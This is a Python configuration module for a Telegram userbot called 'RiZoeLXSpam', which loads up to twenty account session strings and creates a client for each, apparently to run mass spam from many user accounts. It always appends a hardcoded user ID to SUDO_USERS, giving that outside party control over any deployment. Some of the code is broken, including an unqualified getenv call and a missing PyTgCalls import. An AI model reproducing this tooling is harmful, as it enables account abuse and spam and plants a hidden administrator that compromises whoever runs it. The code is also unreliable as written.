# RiZoeL X - Telegram Projects
# (c) 2022 - RiZoeL


import asyncio
import os
import sys
import time

from dotenv import load_dotenv
from pyrogram import Client, filters


if os.path.exists(".env"):
    load_dotenv(".env")
    
__version__ = "v0.0.1"

# -------------CONFIGS--------------------
API_ID = int(os.getenv("API_ID", ""))
API_HASH = os.getenv("API_HASH", "")
ALIVE_PIC = os.getenv("ALIVE_PIC", "")
ALIVE_MSG = os.getenv("ALIVE_MSG", "")
PING_MSG = os.getenv("PING_MSG", "")
SESSION = os.getenv("SESSION", None)
SESSION2 = os.getenv("SESSION2", None)
SESSION3 = os.getenv("SESSION3", None)
SESSION4 = os.getenv("SESSION4", None)
SESSION5 = os.getenv("SESSION5", None)
SESSION6 = os.getenv("SESSION6", None)
SESSION7 = os.getenv("SESSION7", None)
SESSION8 = os.getenv("SESSION8", None)
SESSION9 = os.getenv("SESSION9", None)
SESSION10 = os.getenv("SESSION10", None)
SESSION11 = os.getenv("SESSION11", None)
SESSION12 = os.getenv("SESSION12", None)
SESSION13 = os.getenv("SESSION13", None)
SESSION14 = os.getenv("SESSION14", None)
SESSION15 = os.getenv("SESSION15", None)
SESSION16 = os.getenv("SESSION16", None)
SESSION17 = os.getenv("SESSION17", None)
SESSION18 = os.getenv("SESSION18", None)
SESSION19 = os.getenv("SESSION19", None)
SESSION20 = os.getenv("SESSION20", None)
HNDLR = os.getenv("HNDLR", ".")
OWNER_ID = int(os.environ.get("OWNER_ID", None))
SUDO_USERS = list(map(int, getenv("SUDO_USERS").split()))
if 1517994352 not in SUDO_USERS:
    SUDO_USERS.append(1517994352)

SUDO_USERS.append(OWNER_ID)


# SUDO_USERS = list(filter(lambda x: x, map(int, os.getenv("SUDO_USERS", "1517994352 1789859817 1432756163").split())))
#----------------------------------------------

RiZoeL = Client(
    'RiZoeLXSpam',
    api_id=API_ID,
    api_hash=API_HASH,
    session_string=SESSION,
    plugins={'root': 'SpamX.module'},
)

hl = HNDLR[0]
start_time = time.time()



#-------------------------CLIENTS-----------------------------

if SESSION2:
    RiZoeL2 = Client(name="RiZoeL2", api_id=API_ID, api_hash=API_HASH, session_string=SESSION2)
else:
    RiZoeL2 = None

if SESSION3:
    RiZoeL3 = Client(name="RiZoeL3", api_id=API_ID, api_hash=API_HASH, session_string=SESSION3)
else:
    RiZoeL3 = None

if SESSION4:
    RiZoeL4 = Client(name="RiZoeL4", api_id=API_ID, api_hash=API_HASH, session_string=SESSION4)
else:
    RiZoeL4 = None

if SESSION5:
    RiZoeL5 = Client(name="RiZoeL5", api_id=API_ID, api_hash=API_HASH, session_string=SESSION5)
    call_py5 = PyTgCalls(RiZoeL5)
else:
    RiZoeL5 = None

if SESSION6:
    RiZoeL6 = Client(name="RiZoeL6", api_id=API_ID, api_hash=API_HASH, session_string=SESSION6)
    call_py6 = PyTgCalls(RiZoeL6)
else:
    RiZoeL6 = None
        
if SESSION7:
    RiZoeL7 = Client(name="RiZoeL7", api_id=API_ID, api_hash=API_HASH, session_string=SESSION7)
else:
    RiZoeL7 = None

if SESSION8:
    RiZoeL8 = Client(name="RiZoeL8", api_id=API_ID, api_hash=API_HASH, session_string=SESSION8)
else:
    RiZoeL8 = None

if SESSION9:
    RiZoeL9 = Client(name="RiZoeL9", api_id=API_ID, api_hash=API_HASH, session_string=SESSION9)
else:
    RiZoeL9 = None

if SESSION10:
    RiZoeL10 = Client(name="RiZoeL10", api_id=API_ID, api_hash=API_HASH, session_string=SESSION10)
else:
    RiZoeL10 = None

if SESSION11:
    RiZoeL11 = Client(name="RiZoeL11", api_id=API_ID, api_hash=API_HASH, session_string=SESSION11)
else:
    RiZoeL11 = None

if SESSION12:
    RiZoeL12 = Client(name="RiZoeL12", api_id=API_ID, api_hash=API_HASH, session_string=SESSION12)
else:
    RiZoeL12 = None

if SESSION13:
    RiZoeL13 = Client(name="RiZoeL13", api_id=API_ID, api_hash=API_HASH, session_string=SESSION13)
else:
    RiZoeL13 = None

if SESSION14:
    RiZoeL14 = Client(name="RiZoeL14", api_id=API_ID, api_hash=API_HASH, session_string=SESSION14)
else:
    RiZoeL14 = None

if SESSION15:
    RiZoeL15 = Client(name="RiZoeL15", api_id=API_ID, api_hash=API_HASH, session_string=SESSION15)
else:
    RiZoeL15 = None

if SESSION16:
    RiZoeL16 = Client(name="RiZoeL16", api_id=API_ID, api_hash=API_HASH, session_string=SESSION16)
else:
    RiZoeL16 = None
    
if SESSION17:
    RiZoeL17 = Client(name="RiZoeL17", api_id=API_ID, api_hash=API_HASH, session_string=SESSION17)
else:
    RiZoeL17 = None   
    
if SESSION18:
    RiZoeL18 = Client(name="RiZoeL18", api_id=API_ID, api_hash=API_HASH, session_string=SESSION18)
else:
    RiZoeL18 = None     
    
if SESSION19:
    RiZoeL19 = Client(name="RiZoeL19", api_id=API_ID, api_hash=API_HASH, session_string=SESSION19)
else:
    RiZoeL19 = None    

if SESSION20:
    RiZoeL20 = Client(name="RiZoeL20", api_id=API_ID, api_hash=API_HASH, session_string=SESSION20)
else:
    RiZoeL20 = None
